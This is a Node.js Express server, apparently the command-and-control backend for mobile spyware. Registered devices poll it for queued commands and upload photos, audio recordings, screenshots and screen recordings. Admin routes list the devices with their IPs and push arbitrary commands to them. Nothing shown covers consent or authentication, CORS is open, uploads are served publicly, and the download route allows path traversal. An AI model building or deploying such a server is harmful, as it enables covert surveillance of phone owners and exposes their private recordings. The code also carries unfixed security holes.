const express = require('express');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory
const UPLOAD_DIR = 'uploads';
const PHOTOS_DIR = path.join(UPLOAD_DIR, 'photos');
const RECORDINGS_DIR = path.join(UPLOAD_DIR, 'recordings');
const SCREENSHOTS_DIR = path.join(UPLOAD_DIR, 'screenshots');
const SCREEN_RECORDINGS_DIR = path.join(UPLOAD_DIR, 'screen_recordings');

// Ensure directories exist
[UPLOAD_DIR, PHOTOS_DIR, RECORDINGS_DIR, SCREENSHOTS_DIR, SCREEN_RECORDINGS_DIR].forEach(dir => {
  fs.ensureDirSync(dir);
});

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    if (file.fieldname === 'screenshot') {
      cb(null, SCREENSHOTS_DIR);
    } else if (file.fieldname === 'audio_file') {
      cb(null, RECORDINGS_DIR);
    } else if (file.fieldname === 'file') {
      cb(null, SCREEN_RECORDINGS_DIR);
    } else {
      cb(null, UPLOAD_DIR);
    }
  },
  filename: function (req, file, cb) {
    const uniqueName = `${Date.now()}-${Math.round(Math.random() * 1E9)}${path.extname(file.originalname)}`;
    cb(null, uniqueName);
  }
});

const upload = multer({ storage: storage });

// In-memory storage
const registeredDevices = {};
const deviceCommands = {};
const deviceStatus = {};

// Helper function to get device IP
const getDeviceIP = (req) => {
  return req.ip || req.connection.remoteAddress || 'unknown';
};

// ==================== ROUTES ====================

// Home route
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'Mobile WiFi Server - Node.js',
    server_ip: req.headers.host,
    endpoints: {
      register_device: '/register_device [POST]',
      update_status: '/update_status [POST]',
      get_commands: '/get_commands/:device_id [GET]',
      upload_photo: '/upload_photo [POST]',
      upload_screen_recording: '/upload_screen_recording [POST]',
      screenshot_upload: '/screenshot/upload [POST]',
      upload_data: '/data [POST]',
      admin_devices: '/admin/devices [GET]',
      send_command: '/admin/send_command [POST]'
    }
  });
});

// Ping endpoint
app.get('/ping', (req, res) => {
  res.json({ status: 'pong', timestamp: new Date().toISOString() });
});

// Register device
app.post('/register_device', (req, res) => {
  try {
    const { device_id } = req.body;
    
    if (!device_id) {
      return res.status(400).json({ error: 'Device ID is required' });
    }
    
    registeredDevices[device_id] = {
      registered_at: new Date().toISOString(),
      last_seen: new Date().toISOString(),
      status: 'active',
      ip: getDeviceIP(req)
    };
    
    if (!deviceCommands[device_id]) {
      deviceCommands[device_id] = [];
    }
    
    console.log(`Device registered: ${device_id}`);
    
    res.json({
      status: 'success',
      message: `Device ${device_id} registered successfully`,
      device_id: device_id
    });
    
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Update device status
app.post('/update_status', (req, res) => {
  try {
    const { device_id, status = 'idle', recording = false, screen_recording = false } = req.body;
    
    if (!device_id) {
      return res.status(400).json({ error: 'Device ID is required' });
    }
    
    deviceStatus[device_id] = {
      status,
      recording,
      screen_recording,
      last_updated: new Date().toISOString(),
      ip: getDeviceIP(req)
    };
    
    // Update last seen
    if (registeredDevices[device_id]) {
      registeredDevices[device_id].last_seen = new Date().toISOString();
    }
    
    console.log(`Status updated - Device: ${device_id}, Status: ${status}`);
    
    res.json({
      status: 'updated',
      device_id: device_id,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Status update error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Get commands for device
app.get('/get_commands/:device_id', (req, res) => {
  try {
    const { device_id } = req.params;
    
    if (!registeredDevices[device_id]) {
      return res.status(404).json({ error: 'Device not registered' });
    }
    
    // Update last seen
    registeredDevices[device_id].last_seen = new Date().toISOString();
    
    // Get commands
    const commands = deviceCommands[device_id] || [];
    
    // Clear commands after sending
    deviceCommands[device_id] = [];
    
    console.log(`Sending ${commands.length} commands to device ${device_id}`);
    
    res.json({
      device_id: device_id,
      commands: commands,
      timestamp: new Date().toISOString(),
      count: commands.length
    });
    
  } catch (error) {
    console.error('Get commands error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Upload photo
app.post('/upload_photo', upload.none(), (req, res) => {
  try {
    const device_id = req.headers['x-device-id'] || req.body.device_id || 'unknown';
    const filename = req.headers['x-file-name'] || `photo_${Date.now()}.jpg`;
    
    // Check if photo data is in request body
    if (req.body && req.body.data) {
      // Handle base64 encoded photo
      const base64Data = req.body.data.replace(/^data:image\/\w+;base64,/, '');
      const buffer = Buffer.from(base64Data, 'base64');
      
      const uniqueFilename = `${device_id}_${Date.now()}_${filename}`;
      const filepath = path.join(PHOTOS_DIR, uniqueFilename);
      
      fs.writeFileSync(filepath, buffer);
      
      const sizeKB = (buffer.length / 1024).toFixed(2);
      
      console.log(`Photo uploaded - Device: ${device_id}, Size: ${sizeKB} KB`);
      
      return res.json({
        status: 'success',
        message: 'Photo uploaded successfully',
        filename: uniqueFilename,
        size_kb: sizeKB,
        device_id: device_id
      });
    }
    
    // Handle multipart photo upload
    if (req.files && req.files.photo) {
      const file = req.files.photo;
      const uniqueFilename = `${device_id}_${Date.now()}_${file.name}`;
      const filepath = path.join(PHOTOS_DIR, uniqueFilename);
      
      fs.moveSync(file.path, filepath);
      
      const stats = fs.statSync(filepath);
      const sizeKB = (stats.size / 1024).toFixed(2);
      
      console.log(`Photo uploaded (file) - Device: ${device_id}, Size: ${sizeKB} KB`);
      
      return res.json({
        status: 'success',
        message: 'Photo uploaded successfully',
        filename: uniqueFilename,
        size_kb: sizeKB
      });
    }
    
    res.status(400).json({ error: 'No photo data received' });
    
  } catch (error) {
    console.error('Photo upload error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Upload screen recording
app.post('/upload_screen_recording', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file received' });
    }
    
    const device_id = req.body.device_id || req.headers['x-device-id'] || 'unknown';
    const filename = req.file.originalname;
    
    const uniqueFilename = `screen_${device_id}_${Date.now()}_${filename}`;
    const newPath = path.join(SCREEN_RECORDINGS_DIR, uniqueFilename);
    
    fs.moveSync(req.file.path, newPath);
    
    const stats = fs.statSync(newPath);
    const sizeMB = (stats.size / (1024 * 1024)).toFixed(2);
    
    console.log(`Screen recording uploaded - Device: ${device_id}, Size: ${sizeMB} MB`);
    
    res.json({
      status: 'success',
      message: 'Screen recording uploaded',
      filename: uniqueFilename,
      size_mb: sizeMB,
      device_id: device_id
    });
    
  } catch (error) {
    console.error('Screen recording upload error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Upload screenshot
app.post('/screenshot/upload', upload.single('screenshot'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No screenshot file' });
    }
    
    const device_id = req.body.device_id || 'unknown';
    const command_id = req.body.command_id || 'unknown';
    
    const uniqueFilename = `screenshot_${device_id}_${command_id}_${Date.now()}.png`;
    const newPath = path.join(SCREENSHOTS_DIR, uniqueFilename);
    
    fs.moveSync(req.file.path, newPath);
    
    const stats = fs.statSync(newPath);
    const sizeKB = (stats.size / 1024).toFixed(2);
    
    console.log(`Screenshot uploaded - Device: ${device_id}, Size: ${sizeKB} KB`);
    
    res.json({
      status: 'success',
      message: 'Screenshot uploaded',
      filename: uniqueFilename,
      size_kb: sizeKB,
      device_id: device_id,
      command_id: command_id
    });
    
  } catch (error) {
    console.error('Screenshot upload error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Upload audio/data
app.post('/data', upload.single('audio_file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No audio file' });
    }
    
    const device_id = req.body.device_id || 'unknown';
    
    const uniqueFilename = `audio_${device_id}_${Date.now()}.3gp`;
    const newPath = path.join(RECORDINGS_DIR, uniqueFilename);
    
    fs.moveSync(req.file.path, newPath);
    
    const stats = fs.statSync(newPath);
    const sizeMB = (stats.size / (1024 * 1024)).toFixed(2);
    
    console.log(`Audio uploaded - Device: ${device_id}, Size: ${sizeMB} MB`);
    
    res.json({
      status: 'success',
      message: 'Audio uploaded',
      filename: uniqueFilename,
      size_mb: sizeMB,
      device_id: device_id
    });
    
  } catch (error) {
    console.error('Audio upload error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Admin: Get all devices
app.get('/admin/devices', (req, res) => {
  try {
    const devicesList = Object.keys(registeredDevices).map(device_id => {
      const deviceInfo = registeredDevices[device_id] || {};
      const statusInfo = deviceStatus[device_id] || {};
      
      return {
        device_id: device_id,
        registered_at: deviceInfo.registered_at,
        last_seen: deviceInfo.last_seen,
        status: statusInfo.status || 'unknown',
        recording: statusInfo.recording || false,
        screen_recording: statusInfo.screen_recording || false,
        pending_commands: (deviceCommands[device_id] || []).length,
        ip: deviceInfo.ip || 'unknown'
      };
    });
    
    res.json({
      status: 'success',
      total_devices: devicesList.length,
      devices: devicesList,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Get devices error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Admin: Send command to device
app.post('/admin/send_command', (req, res) => {
  try {
    const { device_id, command } = req.body;
    
    if (!device_id || !command) {
      return res.status(400).json({ error: 'Device ID and command are required' });
    }
    
    if (!registeredDevices[device_id]) {
      return res.status(404).json({ error: 'Device not registered' });
    }
    
    if (!deviceCommands[device_id]) {
      deviceCommands[device_id] = [];
    }
    
    deviceCommands[device_id].push(command);
    
    console.log(`Command sent - Device: ${device_id}, Command: ${command}`);
    
    res.json({
      status: 'success',
      message: `Command '${command}' sent to device ${device_id}`,
      device_id: device_id,
      command: command,
      pending_commands: deviceCommands[device_id].length
    });
    
  } catch (error) {
    console.error('Send command error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Admin: Clear commands for device
app.delete('/admin/clear_commands/:device_id', (req, res) => {
  try {
    const { device_id } = req.params;
    
    if (deviceCommands[device_id]) {
      deviceCommands[device_id] = [];
      console.log(`Commands cleared for device: ${device_id}`);
      res.json({
        status: 'success',
        message: `Commands cleared for device ${device_id}`
      });
    } else {
      res.status(404).json({ error: 'Device not found' });
    }
    
  } catch (error) {
    console.error('Clear commands error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Download file
app.get('/download/:type/:filename', (req, res) => {
  try {
    const { type, filename } = req.params;
    
    let directory;
    switch (type) {
      case 'photo': directory = PHOTOS_DIR; break;
      case 'audio': directory = RECORDINGS_DIR; break;
      case 'screenshot': directory = SCREENSHOTS_DIR; break;
      case 'screen_recording': directory = SCREEN_RECORDINGS_DIR; break;
      default: return res.status(400).json({ error: 'Invalid file type' });
    }
    
    const filepath = path.join(directory, filename);
    
    if (!fs.existsSync(filepath)) {
      return res.status(404).json({ error: 'File not found' });
    }
    
    res.download(filepath);
    
  } catch (error) {
    console.error('Download error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Static files (for web interface)
app.use('/uploads', express.static('uploads'));

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// Start server
app.listen(PORT, () => {
  console.log(`
  ==============================================
  🚀 MOBILE WIFI SERVER STARTED
  ==============================================
  📍 Port: ${PORT}
  📁 Uploads: ${UPLOAD_DIR}/
  🌐 URL: http://localhost:${PORT}
  ==============================================
  📸 Photos: ${PHOTOS_DIR}/
  🎤 Recordings: ${RECORDINGS_DIR}/
  📱 Screenshots: ${SCREENSHOTS_DIR}/
  🎥 Screen Recordings: ${SCREEN_RECORDINGS_DIR}/
  ==============================================
  ✅ Server is running...
  ==============================================
  `);
});
